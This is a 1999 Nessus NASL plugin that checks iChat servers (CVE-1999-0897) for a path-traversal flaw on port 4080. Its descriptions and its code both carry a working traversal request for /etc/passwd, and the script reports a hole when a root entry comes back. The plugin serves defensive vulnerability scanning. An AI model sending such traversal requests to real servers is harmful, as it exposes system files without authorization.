#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10110);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-1999-0897");
 name["english"] = "iChat";
 name["francais"] = "iChat";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "iChat servers up to version 3.00 allow 
any remote user to read arbitrary files on the target system
by doing the request :
	http://chat.server:4080/../../../../../etc/passwd

Risk factor : High

Solution : Upgrade your iChat server or disable it";

 desc["francais"] = "Les serveurs iChat, jusqu'à la version 3.00,
permettent à n'importe quel utilisateur distant de lire des fichiers
arbitraires en faisant simplement une requète du type :
	http://chat.server:4080/../../../../../etc/passwd

Facteur de risque : Elevé.

Solution : Mettez à jour votre serveur iChat, ou alors désactivez le";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Determines if iChat is vulnerable to a stupid bug";
 summary["francais"] = "Determine si iChat est vulnérable à un bug stupide";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Remote file access";
 family["francais"] = "Accès aux fichiers distants";
 
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(4080);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");


if(get_port_state(4080))
{
 data = http_get(item:"../../../../../../../etc/passwd", port:4080);
 soc = http_open_socket(4080);
 if(soc)
 {
  send(socket:soc, data:data);
  result = http_recv(socket:soc);
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:result))security_hole(4080);
  http_close_socket(soc);
 }
}
